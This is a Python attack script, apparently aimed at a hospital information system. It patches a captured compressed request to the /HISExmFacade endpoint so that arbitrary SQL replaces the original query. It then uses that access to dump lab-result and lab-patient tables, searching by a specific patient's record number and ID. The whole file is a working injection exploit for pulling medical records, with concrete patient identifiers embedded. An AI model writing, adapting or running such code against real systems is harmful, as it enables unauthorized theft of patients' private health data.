from his_client_final import HISClient
import requests
import zlib
import re

class PCUNHunter(HISClient):
    def execute_sql(self, sql):
        #print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = PCUNHunter()
hhisnum = '003617083J'
hidno = 'C221748019'

# 1. Check TB_LIS_RESULT sample for ID format
print("Checking TB_LIS_RESULT sample data...")
q = "SELECT * FROM PCUN.TB_LIS_RESULT WHERE ROWNUM <= 5"
res = hunter.execute_sql(q)
if res and "<NewDataSet>" in res:
    print(res[:2000])
else:
    print("[-] No sample data from TB_LIS_RESULT")

# 2. Check other PCUN tables
candidates = [
    "PCUN.TB_RESULT_EX",
    "PCUN.TB_RESULT_VGHTC",
    "PCUN.LABPATIENT",
    "PCUN.TB_PF_LIS"
]

for t in candidates:
    print(f"\nScanning {t} for {hhisnum}/{hidno}...")
    q1 = f"SELECT * FROM {t} WHERE ROWNUM <= 1" # Get sample first to guess column?
    # Better: just try generalized query if possible, or blind assumption of HHISNUM?
    # PCUN seems to use PATNUM/HOSPNUM/PID.
    
    # Try generic columns
    queries = [
        f"SELECT * FROM {t} WHERE PATNUM = '{hhisnum}'",
        f"SELECT * FROM {t} WHERE HOSPNUM = '{hhisnum}'",
        f"SELECT * FROM {t} WHERE PID = '{hidno}'",
        f"SELECT * FROM {t} WHERE HHISNUM = '{hhisnum}'" # Just in case
    ]
    
    found = False
    for Q in queries:
        r = hunter.execute_sql(Q)
        if r and "<NewDataSet>" in r:
             print(f"!!! FOUND DATA IN {t} !!!")
             print(r[:2000])
             found = True
             break
    
    if not found:
        # Check sample to see columns
        r_samp = hunter.execute_sql(f"SELECT * FROM {t} WHERE ROWNUM <= 1")
        if r_samp and "<NewDataSet>" in r_samp:
            print(f"Sample from {t}:")
            print(r_samp[:500]) # Columns preview

